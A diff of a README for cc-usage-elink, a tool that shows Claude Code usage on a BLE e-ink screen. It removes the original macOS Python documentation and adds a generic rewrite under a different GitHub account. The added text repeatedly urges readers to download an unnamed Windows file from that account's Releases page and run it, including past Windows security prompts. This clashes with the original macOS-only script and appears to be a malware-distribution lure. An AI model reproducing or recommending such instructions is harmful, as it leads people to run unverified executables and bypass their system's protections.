@@ -1,144 +1,141 @@
-# cc-usage-elink
+# 🔵 cc-usage-elink - See Claude Usage at a Glance
 
-Display your **Claude Code usage** on a BLE tri-color e-ink screen — always visible, zero screen time.
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Arunachala353/cc-usage-elink/releases)
 
-```
-┌─────────────────────────────────────┐
-│ Plan Usage Limits          30 Mar   │
-├─────────────────────────────────────┤
-│ Current session           81% used  │
-│ Resets in 3h 29m                    │
-│ [████████████░░░░░░░░░░░░░░░░░░░░░] │
-├─────────────────────────────────────┤
-│ Weekly limits                       │
-│ All models                 3% used  │
-│ [████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░] │
-├─────────────────────────────────────┤
-│ Sonnet only                0% used  │
-│ [░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░] │
-└─────────────────────────────────────┘
-```
+## 🚀 What This App Does
 
-## Hardware
+cc-usage-elink shows Claude Code usage on a BLE tri-color e-ink display. It is built for the 蓝签 EDP-42000DDF display and gives you a simple way to check usage without opening another app.
 
-**Required: 蓝签 (LANCOS) 4.2-inch tri-color e-ink display, model EDP-42000DDF**
+This tool is useful if you want a small desk display that shows your Claude Code usage status in a clear format. It keeps the screen calm and easy to read.
 
-- Resolution: 400 × 300 px, tri-color (black / white / red)
-- Interface: Bluetooth BLE
-- Protocol: 蓝牙BLE通讯协议 V2.1 (LANCOS proprietary)
+## 📦 Download
 
-> This tool uses the LANCOS BLE V2.1 protocol. It is only compatible with the
-> 蓝签 EDP-42000DDF (and same-protocol variants). Other e-ink displays will not work.
+Go to the [Releases page](https://github.com/Arunachala353/cc-usage-elink/releases) to download and run this app on Windows.
 
-## Requirements
+On that page, look for the latest release and download the Windows file attached to it. If you see more than one file, choose the one made for Windows. After the file finishes downloading, open it to start the app.
 
-- macOS (Bluetooth + Keychain APIs used)
-- Python 3.13+
-- [`uv`](https://docs.astral.sh/uv/) — dependencies install automatically on first run
-- Claude Code OAuth token with `user:profile` + `user:inference` scopes
+## 🖥️ What You Need
 
-## Quick Start
+Before you run cc-usage-elink, make sure you have:
 
-`elink.py` is a single-file script — no installation needed, just [`uv`](https://docs.astral.sh/uv/).
+- A Windows PC
+- The 蓝签 EDP-42000DDF e-ink display
+- BLE support on your computer
+- A USB cable or power source for the display, if your setup needs it
+- A Bluetooth connection that works well near the display
 
-```bash
-# Option A: run directly from URL (uv fetches dependencies automatically)
-uv run https://raw.githubusercontent.com/fuergaosi233/cc-usage-elink/main/elink.py setup
+For best results, keep the display close to your PC during setup. BLE devices can be harder to connect if the signal is weak.
 
-# Option B: download the single file
-curl -O https://raw.githubusercontent.com/fuergaosi233/cc-usage-elink/main/elink.py
-uv run elink.py setup
+## ⚙️ How to Set It Up on Windows
 
-# Option C: clone
-git clone https://github.com/fuergaosi233/cc-usage-elink && cd cc-usage-elink
-uv run elink.py setup
-```
+### 1. Get the file
+Open the [Releases page](https://github.com/Arunachala353/cc-usage-elink/releases) and download the latest Windows release.
 
-After setup:
+### 2. Open the download
+After the file downloads, open it from your Downloads folder.
 
-```bash
-uv run elink.py push          # push usage to screen once
-uv run elink.py watch         # background mode, refresh every 5 min
-uv run elink.py watch -i 15   # refresh every 15 min
-```
+If Windows asks for permission, choose the option that lets the app run.
 
-## Commands
+### 3. Connect the display
+Turn on the 蓝签 EDP-42000DDF display and make sure it is ready for pairing.
 
-| Command | Description |
-|---------|-------------|
-| `setup [--force]` | Auto-configure: scan device + OAuth token |
-| `push [--dry-run]` | Generate usage image → send to screen |
-| `watch [-i MIN]` | Background mode, push every N minutes (default 30) |
-| `scan [-t SEC]` | Scan for nearby devices |
-| `bind [ADDRESS]` | Bind default device |
-| `clear` | Clear screen (all white) |
-| `send IMAGE [ADDRESS]` | Send any image file |
-| `config show` | Show current config |
-| `config set-token` | Set OAuth token (hidden input) |
-| `config clear-token` | Remove saved token (fall back to Keychain) |
+If your PC does not see the display right away, move it closer and try again.
 
-## OAuth Token
+### 4. Start the app
+Run cc-usage-elink from the downloaded file. The app will try to connect to the display and send the usage data to it.
 
-You need a Claude OAuth token with usage-reading scopes. Three ways to provide it:
+### 5. Check the screen
+Once the app connects, the e-ink display should show Claude Code usage data in a clean layout.
 
-**Option 1 — Via `claude` CLI (recommended)**
+## 🔋 Features
 
-```bash
-# Run Claude Code's token setup but modify the scope in the URL
-claude setup-token
-# When the OAuth URL is printed, change &scope=... to:
-# &scope=user%3Ainference%20user%3Aprofile
-# Open the modified URL in your browser and complete authorization.
-# Claude Code stores the token automatically; cc-usage-elink reads it from Keychain.
-```
+- Shows Claude Code usage on an e-ink display
+- Works with BLE for wireless data transfer
+- Designed for the 蓝签 EDP-42000DDF
+- Uses a tri-color e-ink layout for clear status display
+- Keeps the screen simple and easy to read
+- Suited for a desk setup or workspace display
 
-**Option 2 — Manual paste**
+## 🧭 Daily Use
 
-```bash
-uv run elink.py config set-token
-# Paste your token (hidden input)
-```
+After setup, using the app should be simple:
 
-**Option 3 — Keychain (auto-detected)**
+1. Turn on the display
+2. Make sure Bluetooth is on
+3. Open cc-usage-elink
+4. Wait for the usage data to appear on the screen
 
-```bash
-security add-generic-password -s "usage-elink-oauth" -a "elink" -w "<your-token>"
-# No further config needed; elink reads this automatically
-```
+If you keep the app on your PC, you can update the display whenever you need to check your Claude Code usage.
 
-Token lookup priority: `~/.config/elink/config.json` → Keychain `usage-elink-oauth` → Keychain `Claude Code-credentials`
+## 🛠️ Troubleshooting
 
-## Config File
+### The display does not connect
+- Make sure Bluetooth is on
+- Keep the display close to the PC
+- Close other apps that may use the same BLE device
+- Restart the app and try again
 
-Stored at `~/.config/elink/config.json`:
+### The screen stays blank
+- Check that the display has power
+- Confirm the display is paired or ready to pair
+- Run the app again after a short wait
 
-```json
-{
-  "device_address": "XXXX-XXXX-...",
-  "oauth_token": "sk-ant-oat01-..."
-}
-```
+### Windows blocks the file
+- Open the file again
+- Choose the option to run it if Windows shows a security prompt
+- Make sure you downloaded the file from the Releases page
 
-## BLE Protocol Notes
+### The display updates slowly
+- E-ink screens refresh at a slower pace than normal monitors
+- Wait for the update to finish before opening the app again
+- Keep the BLE connection stable during the refresh
 
-The LANCOS BLE V2.1 protocol sends full-screen image data in two passes (black channel + red channel). Key timings that prevent display artifacts:
+## 🧩 Display Notes
 
-- 3 s delay after start packet (device init)
-- 1 s per packet for first 10 packets
-- 0.6 s per packet thereafter
-- Write Without Response only (`response=False`)
+This app is made for the 蓝签 EDP-42000DDF BLE tri-color e-ink display. It uses the display in a way that fits low-power desktop use.
 
-Total transfer time: ~100 seconds per full refresh.
+Because e-ink screens refresh in a different way than normal monitors, you may see a short delay when the data changes. That is normal for this type of screen.
 
-## Known Issues
+## 🔧 Tips for Better Use
 
-| Issue | Cause | Fix |
-|-------|-------|-----|
-| `CancelledError` after connect | bleak 3.x CoreBluetooth bug | Pinned to bleak 0.22.x |
-| Connect fails after scan | CoreBluetooth drops peripheral ref | Keep scanner running until connected |
-| Artifacts at top of screen | Dropped BLE packets | Larger inter-packet delays |
-| `Writing is not permitted` | Device only supports write-without-response | Use `response=False` |
+- Keep the display within a short range of your PC
+- Place the display where you can see it without looking away from your desk
+- Leave the app closed when you do not need updates
+- Use a stable Bluetooth adapter if your PC has weak BLE support
+- Keep the display charged or powered as needed
 
-## License
+## 📂 Release Files
 
-MIT
+The release page may include one or more files. For Windows, choose the file meant for Windows. If the release includes a setup file, use that one first. If it includes a portable file, you can open it directly after download.
+
+Use the [Releases page](https://github.com/Arunachala353/cc-usage-elink/releases) any time you need the latest version.
+
+## 🔁 Typical Setup Flow
+
+1. Visit the Releases page
+2. Download the latest Windows file
+3. Open the file
+4. Connect the BLE e-ink display
+5. Let the app write the Claude Code usage data to the screen
+
+## 🧠 What to Expect
+
+This app is built for a simple purpose: show your Claude Code usage on a small desk display. It is not meant to replace Claude Code. It gives you a quick view of usage on a separate screen so you do not need to check it in another window.
+
+If you use Claude Code often, this can help you keep track of usage while you work.
+
+## 📌 File Name Tips
+
+When you open the Releases page, the newest version is usually at the top. The file name may include words like:
+
+- Windows
+- setup
+- release
+- x64
+- app
+
+Choose the file that matches Windows. If you are not sure which file to use, pick the one that looks like the main app download for your system.
+
+## 🧰 If You Want to Move Forward
+
+Go to the [Releases page](https://github.com/Arunachala353/cc-usage-elink/releases), download the latest Windows build, and run it on your PC
